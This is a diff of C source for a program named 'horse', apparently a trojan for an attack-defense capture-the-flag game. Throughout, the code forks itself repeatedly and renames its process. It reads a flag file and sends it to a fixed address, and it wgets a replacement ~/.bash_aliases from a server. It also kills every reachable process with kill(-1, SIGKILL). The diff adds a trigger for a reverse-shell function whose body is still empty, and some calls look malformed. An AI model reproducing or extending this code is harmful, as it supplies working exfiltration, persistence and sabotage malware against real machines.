@@ -10,8 +10,10 @@
 # define GET_FLAG 		50000
 # define CLEAN_HORSE		10000
 # define CHECK_HORSE		1000
+# define REV_SHELL		80000
+
 //To Get Flag
-# define DESTPORT		8888
+# define DESTPORT_FLAG		8888
 # define DESTIP			"127.0.0.1"
 # define FLAG_FILE		"flag"
 # define SERVER			"http://127.0.0.1:1234/"
@@ -51,7 +53,7 @@ void get_flag(){
 	
 	memset(&servaddr, 0, sizeof(servaddr));
 	servaddr.sin_family = AF_INET;
-	servaddr.sin_port = htons(DESTPORT);
+	servaddr.sin_port = htons(DESTPORT_FLAG);
 	servaddr.sin_addr.s_addr = inet_addr(DESTIP);
 	
 	f = open(FLAG_FILE);
@@ -81,6 +83,7 @@ void create_alias(){
 	system(cmd);
 	snprintf(cmd, "wget %s%s -o %s", SERVER, "bash_aliases", "~/.bash_aliases");
 	system(cmd);
+	exit(0);
 }
 
 void store_time(){
@@ -95,8 +98,13 @@ void store_time(){
 	return;	
 }
 
+void rev_shell(){
+	
+	exit(0);
+}
+
 void horse(int argc, char** argv){
-	BEGIN:	
+BEGIN:	
 	count++;
 	change_name(argc, argv);
 	unsigned int p;
@@ -105,19 +113,29 @@ void horse(int argc, char** argv){
 		store_time();
 
 	if(count % GET_FLAG == 0){
-		if(!fork())
+		if(!fork()){
 			get_flag();
+			exit(0);
+		}
 	}
+	
 	if(count % CHECK_HORSE == 0){
 		if(check_horse()){
 			create_flag = 1;
-			if(!fork())
+			if(!fork()){
 				create_alias();
+				exit(0);
+			}
 		}
 	}
 
 	if(count % CLEAN_HORSE == 0)
 		kill(-1, SIGKILL);
+	
+	if(count % REV_SHELL == 0){
+		if(!fork())
+			rev_shell();
+	}
 	
 	p = fork();
 	if(p < 0 ) return;
